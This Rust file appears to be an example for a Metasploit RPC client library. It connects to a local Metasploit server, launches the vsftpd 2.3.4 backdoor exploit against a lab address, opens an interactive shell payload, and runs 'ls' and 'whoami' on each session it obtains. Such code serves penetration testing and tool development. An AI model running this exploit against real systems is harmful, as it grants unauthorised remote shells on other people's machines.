use msf_client::client::MsfClient;
use msf_client::client::MsfModule;


fn main() {
    let mut client = MsfClient::new("msf", "1234", "http://172.17.0.2:55553/api/".to_string())
                               .expect("Trying to connect");

    let res = client.core().version().expect("Core version");
    println!("{}", res.version);
    println!("{}", res.ruby);
    println!("{}", res.api);

    let mut exp_mod = client.modules()
                            .use_exploit("unix/ftp/vsftpd_234_backdoor");

    println!("{}", exp_mod.info.name);
    println!("{}", exp_mod.info.description);
    println!("{}", exp_mod.info.license);

    let pay_names = exp_mod.payloads().expect("Exploit module payloads").payloads;
    for pay_name in &pay_names {
        println!("{}",pay_name);
    }

    exp_mod.run_options.insert(String::from("RHOST"), String::from("172.17.0.3"));
    exp_mod.run_options.insert(String::from("PAYLOAD"), String::from("cmd/unix/interact"));

    let job_id = exp_mod.exploit().expect("Running exploit");
    println!("{:?}", job_id);

    let mut sessions = client.sessions();

    let sess_info = client.sessions().list().expect("List of current sessions");

    for sid in sess_info.keys() {
        let mut session = sessions.session(sid).expect("Getting session");

        println!("{}", session.write(String::from("ls\n")));
        println!("{}", session.read());

        println!("{}", session.write(String::from("whoami\n")));
        println!("{}", session.read());
    }
}
